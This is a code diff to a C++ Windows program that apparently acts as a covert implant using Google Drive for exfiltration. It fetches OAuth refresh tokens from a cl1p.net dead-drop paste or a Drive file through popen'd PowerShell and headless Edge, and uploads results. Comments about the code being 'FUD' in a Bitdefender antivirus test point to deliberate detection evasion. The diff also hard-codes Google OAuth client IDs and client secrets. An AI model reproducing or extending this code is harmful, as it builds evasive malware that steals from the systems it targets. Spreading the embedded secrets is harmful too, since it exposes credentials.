@@ -4,6 +4,12 @@
 #include <cmath>
 #include <algorithm>
 
+
+
+
+//"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --dump-dom "https://drive.google.com/file/d/1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1/view" > a.txt
+
+
 #define PROGRAM_CYCLE_THRESHOLD 4100 * 1000 
 #define FAILSAFE_THRESHOLD 2402 * 1000
 #define EXPONENTIAL_POWER 4
@@ -30,14 +36,21 @@
 #define STATE_REFRESH_TOKEN_LOST 0b101
 #define STATE_CONNECTION_LOST 0b1000
 
-#define CLIENT_SECRET "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"
-#define CLIENT_ID "1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com"
+
+#define CLIPBOARD "75367536"
+#define CLIENT_SECRET "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"
+#define CLIENT_ID "1013834111625-kc1mpb1btv5e7nci2lak6f4v8nklon3p.apps.googleusercontent.com"
 #define RESULT_FOLDER_ID "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB"
 #define BACKUP_FILE_ID "1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1"
 
 static const char bs64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 "abcdefghijklmnopqrstuvwxyz"
 "0123456789+/";
+
+static bool PathExists(std::string path) {
+	DWORD attributes = GetFileAttributesA(path.c_str());
+	return attributes != INVALID_FILE_ATTRIBUTES;
+}
 
 static DWORD expo(DWORD base, DWORD exponent) {
 	if (exponent == 0) {
@@ -120,8 +133,7 @@ static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken
 			errorCode = BDRIVE_INVALID_REFRESH_TOKEN;
 		}
 	}
-
-	accessToken = buffer;
+	else { accessToken = buffer; }
 
 	delete[] buffer;
 	return errorCode;
@@ -130,7 +142,7 @@ static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken
 
 /// <summary>
 /// This method is going to get used in handling failsafe situation.
-/// ***In the AV test this method isn't FUD. The alternative would be using _popen in another thread and refreshing it in timout interval***
+/// ***In the Bitdefender AV test this method isn't FUD.***
 /// </summary>
 /// <param name="refreshToken">A string to output new Refresh Token</param>
 /// <param name="accessToken">A string to output new Access Token</param>
@@ -140,7 +152,7 @@ static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken
 /// BDRIVE_INVALID_REFRESH_TOKEN
 /// 600 Invoke-Restmethod Timedout!
 /// </returns>
-static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken) {
+static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken, int n) {
 #define BUFFER_SIZE 1024
 	char* buffer = new char[BUFFER_SIZE];
 
@@ -177,6 +189,109 @@ static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& 
 #undef BUFFER_SIZE
 }
 
+/// <summary>
+/// This method is going to get used in handling failsafe situation.
+/// ***This method doesn't act deterministic***
+/// </summary>
+/// <param name="refreshToken"></param>
+/// <param name="accessToken"></param>
+/// <returns></returns>
+static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken, char n) {
+#define BUFFER_SIZE 1024
+
+	std::string output;
+	std::string edgePath64 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
+	std::string edgePath32 = "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
+	std::string edgePath = PathExists(edgePath64) ? edgePath64 : edgePath32;
+
+	char* buffer = new char[BUFFER_SIZE];
+
+	sprintf_s(buffer, BUFFER_SIZE - 1, "\"\"%s\" --headless --dump-dom \"https://drive.google.com/file/d/%s/view\" --user-data-dir=\"C:\\Users\\Public\\temp\" \"", edgePath.c_str(), BACKUP_FILE_ID);
+
+	FILE* file = _popen(buffer, "r");
+	////// you should edit this
+	while (fgets(buffer, sizeof(buffer), file) != nullptr) {
+		output += buffer;
+	}
+	_pclose(file);
+	delete[] buffer;
+	size_t pos = output.find("\"1//");
+	pos != std::string::npos ? static_cast<int>(pos) : -1;
+	if (pos != -1)
+	{
+		pos++; //increment the pos to skip the first quote
+		int count = 1;
+		while (output[pos + count] != '\"') {
+			count++;
+			if (pos + count > output.length()) {
+				return BDRIVE_NO_INTERNET;
+			}
+		}
+		output = output.substr(pos, count);
+		refreshToken = output;
+		return setNewAccessToken(accessToken, refreshToken);
+	}
+	else {
+		return BDRIVE_NO_INTERNET;
+	}
+
+#undef BUFFER_SIZE
+}
+
+/// <summary>
+/// This method is going to get used in handling failsafe situation.
+/// </summary>
+/// <param name="refreshToken">A string to output new Refresh Token</param>
+/// <param name="accessToken">A string to output new Access Token</param>
+/// <returns>
+/// setNewAccessToken ErrorCodes!
+/// BDRIVE_NO_REFRESH
+/// BDRIVE_INVALID_REFRESH_TOKEN
+/// BDRIVE_TIMED_OUT Invoke-Restmethod Timedout!
+/// </returns>
+static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken) {
+#define BUFFER_SIZE 1024
+	char* buffer = new char[BUFFER_SIZE];
+	std::string output;
+
+	sprintf_s(buffer, BUFFER_SIZE - 1, "powershell -c \"try{(Invoke-WebRequest https://cl1p.net/%s).Content} catch{Write-Host -NoNewline 600}\"", CLIPBOARD);
+
+	FILE* file = _popen(buffer, "r");
+	////// you should edit this
+	while (fgets(buffer, sizeof(buffer), file) != nullptr) {
+		output += buffer;
+	}
+	_pclose(file);
+	delete[] buffer;
+
+	if (output.substr(0, 3) == "600")
+	{
+		return BDRIVE_NO_INTERNET;
+	}
+
+	size_t pos = output.find("\"1//");
+	pos != std::string::npos ? static_cast<int>(pos) : -1;
+	if (pos != -1)
+	{
+		pos++; //increment the pos to skip the first quote
+		int count = 1;
+		while (output[pos + count] != '\"') {
+			count++;
+			if (pos + count > output.length()) {
+				return BDRIVE_NO_CONTENT;
+			}
+		}
+		output = output.substr(pos, count);
+		refreshToken = output;
+		return setNewAccessToken(accessToken, refreshToken);
+	}
+	else {
+		return BDRIVE_NO_CONTENT;
+	}
+
+#undef BUFFER_SIZE
+}
+
 static WORD checkConnection()
 {
 #define BUFFER_SIZE 512
@@ -187,7 +302,7 @@ static WORD checkConnection()
 	snprintf(buffer, BUFFER_SIZE - 1, "powershell.exe -c \"try { $response = Invoke-WebRequest 'http://www.google.com' -TimeoutSec 30 -Method 'HEAD'; Write-Host -NoNewline $response.StatusCode } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"");
 
 	FILE* file = _popen(buffer, "r");
-	
+
 	fgets(buffer, 4, file);
 
 	if (buffer[0] == '2' || buffer[0] == '4' || buffer[0] == '6')
@@ -355,6 +470,7 @@ static WORD uploadResult(std::string input, std::string accessToken, DWORD index
 
 		if (errorCode != BDRIVE_OK)
 		{
+			subIndex--;
 			return errorCode;
 		}
 	}
